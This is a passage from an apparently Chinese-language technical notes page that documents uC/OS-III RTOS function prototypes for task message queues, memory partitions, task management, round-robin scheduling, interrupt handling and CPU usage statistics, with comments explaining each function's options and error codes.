<span class="comment">// 消息长度。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止一个任务对其消息队列的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NONE 没有选项要求。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NO_SCHED 不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，中止成功。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 目标任务没在等待任务消息队列。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_SELF 目标任务是自身（当前运行任务）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">== DEF_FALSE，目标任务没在等待任务消息队列，或有错误。</span></span><br><span class="line"><span class="comment">== DEF_TRUE，目标任务是在等待任务消息队列，而且等待被中止。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">p_tcb 不能为NULL 或当前运行任务。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_BOOLEAN <span class="title">OSTaskQPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个内存管理对象。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，创建成功。</span></span><br><span class="line"><span class="comment">OS_ERR_CREATE_ISR 在中断中调用该函数</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 在调用OSSafetyCriticalStart() 函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_BLKS 内存块数目非法。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_P_ADDR 内存分区地址非法。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_SIZE 内存空间大小非法。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSMemCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MEM *p_mem,   <span class="comment">// 内存管理对象。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,  <span class="comment">// 命名内存管理对象。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_addr,    <span class="comment">// 内存分区首地址。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MEM_QTY n_blks,  <span class="comment">// 内存块数目，要求不小于2。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MEM_SIZE blk_size,  <span class="comment">// 内存块空间字节数，不少于一个指针的字节数。（STM32 是的指针的字节数是4）。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">向内存管理对象获取一个空闲内存块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，获取成功。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_P_MEM p_mem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_NO_FREE_BLKS 没有空闲的内存块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">获取到的内存块。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">OSMemGet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MEM *p_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">内存块退还回内存管理对象。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，退还成功。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_FULL 内存分区的空闲内存块已满。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_P_BLK p_blk 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_MEM_INVALID_P_MEM p_mem 为空。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSMemPut</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MEM *p_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_blk,   <span class="comment">// 要退还的内存块（的首地址）。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_TASK_NONE 没有选项要求。</span></span><br><span class="line"><span class="comment">OS_OPT_TASK_STK_CHK允许任务进行堆栈检测。</span></span><br><span class="line"><span class="comment">OS_OPT_TASK_STK_CLR堆栈全部进行清0 初始化。</span></span><br><span class="line"><span class="comment">OS_OPT_TASK_SAVE_FP在上下文切换时保存浮点寄存器。STM32 芯片没有浮点寄存器，该项一般不用。</span></span><br><span class="line"><span class="comment">OS_OPT_TASK_NO_TLS屏蔽任务的TLS 支持。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，创建成功。</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME在调用OSSafetyCriticalStart()函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_NAME p_name 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_PRIO_INVALID prio&gt;= S_CFG_PRIO_MAX-1，或者在</span></span><br><span class="line"><span class="comment">OS_CFG_ISR_POST_DEFERRED_EN 被置1 时prio=0。</span></span><br><span class="line"><span class="comment">OS_ERR_STK_SIZE_INVALID p_stk_base 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_STK_LIMIT_INVALID stk_limit 大于stk_size。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_CREATE_ISR 在中断中创建任务。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_INVALID p_task 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_TCB_INVALID p_tcb 为空。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,          <span class="comment">// 任务控制块指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,       <span class="comment">// 命名任务。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TASK_PTR p_task,     <span class="comment">// 任务函数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_arg,            <span class="comment">// 传递给任务函数的参数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_PRIO prio,           <span class="comment">// 任务优先级。uC/OS-III 允许任务拥有相同的优先级。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_STK *p_stk_base,    <span class="comment">// 任务堆栈指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_STK_SIZE stk_limit, <span class="comment">// 任务堆栈的限制空间。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_STK_SIZE stk_size,  <span class="comment">// 任务堆栈总空间。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MSG_QTY q_size,      <span class="comment">// 任务消息队列容量。只有使能了任务消息队列，该参数才有效。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK time_quanta,    <span class="comment">// 时间片（单位：时钟节拍）。如果该参数设为0，表示使用系统默认值</span></span></span></span><br><span class="line"><span class="params"><span class="function">（ OSCfg_TickRate_Hz / <span class="number">10</span>）。</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_ext,            <span class="comment">// 任务扩展内容的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,            </span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err          </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">挂起一个任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，挂起任务成功。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 挂起当前任务时调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_SUSPEND_ISR 在禁用中断延迟发布的情况下，在中断中调用该函数。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_SUSPEND_IDLE 挂起空闲任务。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_SUSPEND_INT_HANDLER 在使能中断延迟发布的情况下，挂起中断延迟提交任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">不能挂起空闲任务。</span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN = 0u 时，不能在中断中调用该函数。</span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN &gt; 0u 时，不能挂起中断延迟提交任务。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskSuspend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,  <span class="comment">// 任务控制块指针，0 表自身。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">解嵌一个被挂起的任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，解嵌成功。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 任务状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_RESUME_ISR 在禁用中断延迟发布的情况下，在中断中调用该函数。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_RESUME_SELF 解嵌自身。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_NOT_SUSPENDED 任务p_tcb 未被挂起。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">不能解嵌自身，即p_tcb 不能为0 或当前运行任务。</span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN = 0u 时，不能在中断中调用该函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskResume</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">改变一个任务的优先级。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_PRIO_INVALID 当使能了中断延迟发布时，prio_new = 0；或者，prio_new &gt;=(OS_CFG_PRIO_MAX-1)。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 目标任务的任务状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_CHANGE_PRIO_ISR 在中断中调用该函数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN &gt; 0u 时，prio_new 不能为0；prio_new 不能&gt;=(OS_CFG_PRIO_MAX-1)。</span></span><br><span class="line"><span class="comment">不能在中断中调用该函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskChangePrio</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_PRIO prio_new,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 任务状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_DEL_IDLE p_tcb 为空闲任务。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_DEL_INVALID 当使能了中断延迟发布时，p_tcb 为中断延迟提交任务。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_DEL_ISR 在中断中调用该函数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN &gt; 0u 时，不能删除中断延迟提交任务。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">配置时间片轮转调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">当OS_CFG_ISR_POST_DEFERRED_EN = 0u 时，不能在中断中调用该函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSchedRoundRobinCfg</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_BOOLEAN en,           <span class="comment">// 使能 DEF_ENABLED/禁用 DEF_DISABLED事件片轮转调度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK dflt_time_quanta, <span class="comment">// 设置默认时间片：&gt;0 把dflt_time_quanta 设为默认时间片值；=0 把系统默认值OSCfg_TickRate_Hz / 10 设为默认时间片值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">放弃时间片。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_ROUND_ROBIN_1 当前优先级的就绪列表中只有一个任务（当前任务）。</span></span><br><span class="line"><span class="comment">OS_ERR_ROUND_ROBIN_DISABLED 未使能时间片轮转调度。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_YIELD_ISR 在中断中调用该函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSchedRoundRobinYield</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设置一个任务的时间片。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_SET_ISR 在中断中调用该函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskTimeQuantaSet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK time_quanta,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设置一个任务的某个任务寄存器的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误，调用成功。</span></span><br><span class="line"><span class="comment">OS_ERR_REG_ID_INVALID Id 不在[ 0，OS_CFG_TASK_REG_TBL_SIZE – 1 ]内。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTaskRegSet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_REG_ID id,  <span class="comment">// 任务寄存器的id，取值范围为[ 0，OS_CFG_TASK_REG_TBL_SIZE – 1 ]。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_REG value,  <span class="comment">// 设置任务寄存器的内容。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取一个任务的某个任务寄存器的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，获取的任务寄存器的值为0（p_err == OS_ERR_NONE），或有错误（p_err !=</span></span><br><span class="line"><span class="comment">OS_ERR_NONE）。</span></span><br><span class="line"><span class="comment">其他，获取的任务寄存器的值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_REG <span class="title">OSTaskRegGet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_REG_ID id,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">os_tcb</span> &#123;</span><br><span class="line">    CPU_STK             *StkPtr;</span><br><span class="line">    <span class="type">void</span>                *ExtPtr;   </span><br><span class="line">    CPU_STK             *StkLimitPtr; </span><br><span class="line"></span><br><span class="line">    OS_TCB              *NextPtr;  </span><br><span class="line">    OS_TCB              *PrevPtr;  </span><br><span class="line"></span><br><span class="line">    OS_TCB              *TickNextPtr;</span><br><span class="line">    OS_TCB              *TickPrevPtr;</span><br><span class="line"></span><br><span class="line">    OS_TICK_SPOKE       *TickSpokePtr; </span><br><span class="line"></span><br><span class="line">    CPU_CHAR            *NamePtr;  </span><br><span class="line">    CPU_STK             *StkBasePtr; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(OS_CFG_TLS_TBL_SIZE) &amp;&amp; (OS_CFG_TLS_TBL_SIZE &gt; 0u)</span></span><br><span class="line">    OS_TLS               TLS_Tbl[OS_CFG_TLS_TBL_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    OS_TASK_PTR          TaskEntryAddr; </span><br><span class="line">    <span class="type">void</span>                *TaskEntryArg; </span><br><span class="line"></span><br><span class="line">    OS_PEND_DATA        *PendDataTblPtr;</span><br><span class="line">    OS_STATE             PendOn;</span><br><span class="line">    OS_STATUS            PendStatus; </span><br><span class="line">    OS_STATE             TaskState;  </span><br><span class="line">    OS_PRIO              Prio; </span><br><span class="line">    CPU_STK_SIZE         StkSize;   </span><br><span class="line">    OS_OPT               Opt;</span><br><span class="line">    OS_OBJ_QTY           PendDataTblEntries;</span><br><span class="line">    CPU_TS               TS; </span><br><span class="line">    OS_SEM_CTR           SemCtr; </span><br><span class="line">    OS_TICK              TickCtrPrev; </span><br><span class="line">    OS_TICK              TickCtrMatch;</span><br><span class="line">    OS_TICK              TickRemain; </span><br><span class="line">    OS_TICK              TimeQuanta;</span><br><span class="line">    OS_TICK              TimeQuantaCtr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_MSG_EN &gt; 0u</span></span><br><span class="line">    <span class="type">void</span>                *MsgPtr; </span><br><span class="line">    OS_MSG_SIZE          MsgSize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_TASK_Q_EN &gt; 0u</span></span><br><span class="line">    OS_MSG_Q             MsgQ;   </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_TASK_PROFILE_EN &gt; 0u</span></span><br><span class="line">    CPU_TS               MsgQPendTime; </span><br><span class="line">    CPU_TS               MsgQPendTimeMax;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_TASK_REG_TBL_SIZE &gt; 0u</span></span><br><span class="line">    OS_REG               RegTbl[OS_CFG_TASK_REG_TBL_SIZE]; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_FLAG_EN &gt; 0u</span></span><br><span class="line">    OS_FLAGS             FlagsPend;</span><br><span class="line">    OS_FLAGS             FlagsRdy; </span><br><span class="line">    OS_OPT               FlagsOpt;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_TASK_SUSPEND_EN &gt; 0u</span></span><br><span class="line">    OS_NESTING_CTR       SuspendCtr; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_TASK_PROFILE_EN &gt; 0u</span></span><br><span class="line">    OS_CPU_USAGE         CPUUsage;</span><br><span class="line">    OS_CPU_USAGE         CPUUsageMax;</span><br><span class="line">    OS_CTX_SW_CTR        CtxSwCtr;</span><br><span class="line">    CPU_TS               CyclesDelta;</span><br><span class="line">    CPU_TS               CyclesStart;</span><br><span class="line">    OS_CYCLES            CyclesTotal;</span><br><span class="line">    OS_CYCLES            CyclesTotalPrev; </span><br><span class="line"></span><br><span class="line">    CPU_TS               SemPendTime;  </span><br><span class="line">    CPU_TS               SemPendTimeMax;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_STAT_TASK_STK_CHK_EN &gt; 0u</span></span><br><span class="line">    CPU_STK_SIZE         StkUsed; </span><br><span class="line">    CPU_STK_SIZE         StkFree;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CPU_CFG_INT_DIS_MEAS_EN</span></span><br><span class="line">    CPU_TS               IntDisTimeMax;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_SCHED_LOCK_TIME_MEAS_EN &gt; 0u</span></span><br><span class="line">    CPU_TS               SchedLockTimeMax;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_TCB              *DbgPrevPtr;</span><br><span class="line">    OS_TCB              *DbgNextPtr;</span><br><span class="line">    CPU_CHAR            *DbgNamePtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="中断管理-1"><a href="#中断管理-1" class="headerlink" title="中断管理"></a>中断管理</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">标记进入中断服务函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSIntEnter</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">标记退出中断服务函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSIntExit</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取整个程序目前的最大关中断时间。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">整个程序目前的最大关中断时间（时间戳时间）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_TS_TMR <span class="title">CPU_IntDisMeasMaxGet</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">开始测量一个程序段的最大关中断时间。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">上一次测量的程序段最大关中断时间（时间戳时间）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_TS_TMR <span class="title">CPU_IntDisMeasMaxCurReset</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结束一个程序段的最大关中断时间的测量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">测量的程序段最大关中断时间（时间戳时间）。</span></span><br><span class="line"><span class="comment">返回值是一个以CPU 时钟运行的计数值，通过BSP_CPU_ClkFreq() 函数可以获取CPU 时钟频率。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_TS_TMR <span class="title">CPU_IntDisMeasMaxCurGet</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h3 id="统计信息"><a href="#统计信息" class="headerlink" title="统计信息"></a>统计信息</h3><p>统计信息的开关在：<code>os_cfg.h\OS_CFG_STAT_TASK_EN</code>。</p>
<p>CPU 使用率和其最大记录分别保存于全局变量<code>OSStatTaskCPUUsage</code> 和<code>OSStatTaskCPUUsageMax</code>，一个任务的CPU 使用率和其最大记录分别保存于其任务控制块的<code>CPUUsage</code> 和<code>CPUUsageMax</code> 成员，一个任务的任务堆栈的空闲大小和已用大小分别保存于其任务控制块的<code>StkFree</code> 和<code>StkUsed</code> 成员。需要注意，<code>OSStatTaskCPUUsage</code>、<code>OSStatTaskCPUUsageMax</code>、<code>CPUUsage</code> 和<code>CPUUsageMax</code> 均被放大了10000 倍，所以这几个值缩小10000 倍后才是真实值。</p>
